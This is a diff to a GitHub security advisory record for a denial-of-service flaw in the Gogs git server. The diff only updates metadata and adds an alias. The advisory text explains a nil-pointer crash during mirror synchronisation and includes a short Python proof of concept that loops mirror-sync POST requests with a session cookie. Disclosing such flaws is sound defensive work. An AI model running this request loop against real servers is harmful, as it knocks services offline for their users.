@@ -1,9 +1,10 @@
 {
   "id": "GHSA-cr88-6mqm-4g57",
-  "modified": "2026-02-06T22:08:16.538896Z",
+  "modified": "2026-02-19T20:41:25.323084Z",
   "published": "2026-02-06T18:08:16Z",
   "aliases": [
-    "CVE-2026-22592"
+    "CVE-2026-22592",
+    "GO-2026-4451"
   ],
   "summary": "Gogs has a Denial of Service issue",
   "details": "### Summary\nAn authenticated user can cause a DOS attack. If one of the repo files is deleted before synchronization, it will cause the application to crash.\n\n### Details\nIf GetMirrorByRepoID fails, the error log dereferencing null pointer. This happens if the repository no longer exits.\nhttps://github.com/gogs/gogs/blob/4cc83c498b6ae59356a04912d68a932165bad5e6/internal/database/mirror.go#L333-L337\nif `err != nil` `m` is alwasa `nil`\nhttps://github.com/gogs/gogs/blob/4cc83c498b6ae59356a04912d68a932165bad5e6/internal/database/mirror.go#L269-L278\n### PoC\nSpam mirror-sync on repo and delete this repo\ncode python spam mirror-sync\n```py\nimport requests\n\nurl = \"http://gogs.lan:3000/superuser/gobypass403/settings\"\nheaders = {\n    \"Cookie\": \"lang=en-US; i_like_gogs=fe32281ab84ae868; _csrf=UCw6xvqR-L7YLBMPjujwjywxy8s6MTc2NDc3NDQ2NDE1MzU5ODQ3Mg\",\n}\n\ndata = {\n    \"_csrf\": \"UCw6xvqR-L7YLBMPjujwjywxy8s6MTc2NDc3NDQ2NDE1MzU5ODQ3Mg\",\n    \"action\": \"mirror-sync\",\n}\n\nwhile True:\n    print(\"syncing\")\n    response = requests.post(url, headers=headers, data=data)\n```\n### Impact\nDenial of Service server crash.",
